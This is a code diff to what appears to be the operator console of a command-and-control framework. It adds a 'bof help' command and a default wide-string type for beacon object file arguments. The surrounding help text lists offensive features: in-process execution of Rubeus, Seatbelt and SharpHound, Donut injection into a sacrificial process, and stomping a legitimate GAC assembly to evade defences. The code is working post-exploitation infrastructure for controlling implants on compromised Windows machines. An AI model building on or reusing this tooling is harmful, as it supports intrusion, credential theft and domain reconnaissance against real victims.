@@ -11077,7 +11077,8 @@ ${isWin ? `
   dotnet-exec &lt;asm.exe&gt; [args]      CLR inline-execute in-process — Rubeus, Seatbelt, SharpHound, etc.
   dotnet-asm &lt;asm.exe&gt; [args] [/proc:&lt;p&gt;]  .NET → Donut → fork-run in sacrificial process
   clrstomp &lt;asm.exe&gt; [args]         .NET without Donut or new process: replace legitimate GAC assembly
-  bof &lt;name|file.o&gt; [args]          execute BOF (COFF x64); name=preinstalled, file.o=uploaded
+  bof &lt;name&gt; [args]                  execute BOF; args without type default to wide string (Z)
+  bof help &lt;name&gt;                    show usage/README for a BOF
   bof list                           list available BOFs on C2 server
   bof catalog                        show curated BOF collection catalog with install status
   bof install                        clone/update default BOF collections on C2 server
@@ -12939,6 +12940,28 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         return;
       }
 
+      // bof help <name> — show README/CNA usage for a BOF
+      if (bofSub === 'help') {
+        const bofHelpName = bofParts[1] || '';
+        if (!bofHelpName) { addConsoleOutput('usage: bof help <bof-name>', '', null); return; }
+        try {
+          const hr = await fetch(`${BASE}/bofs?action=help&name=${encodeURIComponent(bofHelpName)}`, {headers:{'Authorization':'Bearer '+TOKEN}});
+          const hd = await hr.json();
+          if (!hd.ok) { addConsoleOutput('', hd.error || 'not found', null); return; }
+          let out = `\n── ${hd.name}  [${hd.repo}]\n`;
+          if (hd.cna_usage) {
+            out += `\n${hd.cna_usage.trim()}\n`;
+          } else if (hd.readme) {
+            out += `\n${hd.readme.trim()}\n`;
+          } else {
+            out += '\n(no documentation found in repo)\n';
+          }
+          out += `\nPath: ${hd.path}`;
+          addConsoleOutput(out, '', null);
+        } catch(e) { addConsoleOutput('', 'help error: '+e.message, null); }
+        return;
+      }
+
       // bof catalog — show curated BOF collection list
       if (bofSub === 'catalog') {
         try {
@@ -13018,8 +13041,9 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
           const be32 = n => { const b = new ArrayBuffer(4); new DataView(b).setUint32(0, n, false); return new Uint8Array(b); };
           for (const spec of bofArgSpecs) {
             const sep = spec.lastIndexOf(':');
-            if (sep < 0) { addConsoleOutput('', `bad arg: ${spec} (need val:type)`, null); return; }
-            const val = spec.slice(0, sep), typ = spec.slice(sep+1);
+            // No type suffix → default to wide string Z (most common in CS BOFs)
+            const val = sep < 0 ? spec : spec.slice(0, sep);
+            const typ = sep < 0 ? 'Z' : spec.slice(sep+1);
             if (typ === 'z') { const enc = new TextEncoder().encode(val+'\0'); chunks.push(be32(enc.length)); chunks.push(enc); }
             else if (typ === 'Z') { const units=[]; for(let ci=0;ci<val.length;ci++){const c=val.charCodeAt(ci);units.push(c&0xff,c>>8);} units.push(0,0); const wb=new Uint8Array(units); chunks.push(be32(wb.length)); chunks.push(wb); }
             else if (typ === 'i') { const b=new ArrayBuffer(4); new DataView(b).setInt32(0,parseInt(val),false); chunks.push(new Uint8Array(b)); }
